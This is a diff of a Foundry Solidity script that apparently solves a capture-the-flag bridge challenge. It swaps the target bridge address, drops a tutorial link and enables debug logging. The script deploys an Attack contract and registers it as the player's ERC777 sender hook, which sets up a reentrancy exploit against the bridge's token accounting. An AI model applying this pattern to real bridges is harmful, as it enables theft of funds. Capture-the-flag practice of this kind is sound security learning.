@@ -10,9 +10,8 @@ import {IERC1820Registry} from "@openzeppelin-contracts-4.8.0/contracts/utils/in
 
 import {ERC1820Implementer} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/ERC1820Implementer.sol";
 
-// https://zokyo-auditing-tutorials.gitbook.io/zokyo-tutorials/tutorial-25-cross-chain-bridges-vulnerabilities/erc777-bridge-vulnerability-reentrancy-attack-in-token-accounting
 contract BridgeSolve is Script {
-    Bridge public bridge = Bridge(payable(0xf7336fd84911203F1f01ab6803ECCc984700f591));
+    Bridge public bridge = Bridge(payable(0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba));
     Bridge public remoteBridge;
     Token public flagToken;
     
@@ -50,14 +49,14 @@ contract BridgeSolve is Script {
         console.log("FLAG_TOKEN: ", address(flagToken));
         console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
         console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
-        // console.log("SOURCE CHAIN_ID : ", CHAIN_ID);
+        console.log("SOURCE CHAIN_ID : ", CHAIN_ID);
         // console.log("isSolved(): ", bridge.isSolved());
-        // console.log("Total Default operators of FLAG : ", flagToken.defaultOperators().length); // NO operators
+        console.log("Total Default operators of FLAG : ", flagToken.defaultOperators().length); // NO operators
         // console.log("Relayer: ", relayer);
         remoteBridge = Bridge(payable(bridge.remoteBridge(REMOTE_CHAIN_ID)));
-        // console.log("REMOTE CHAIN_ID : ", REMOTE_CHAIN_ID);
+        console.log("REMOTE CHAIN_ID : ", REMOTE_CHAIN_ID);
         console.log("REMOTE Bridge: ", address(remoteBridge));
-        // console.log("REMOTE Bridge balance: ", address(remoteBridge).balance);
+        console.log("REMOTE Bridge balance: ", address(remoteBridge).balance);
         Attack attack = new Attack(address(bridge), /*address(bridgedToken)*/ address(flagToken), player);
         console.log("Attack : ", address(attack));
        _ERC1820_REGISTRY.setInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH, address(attack));
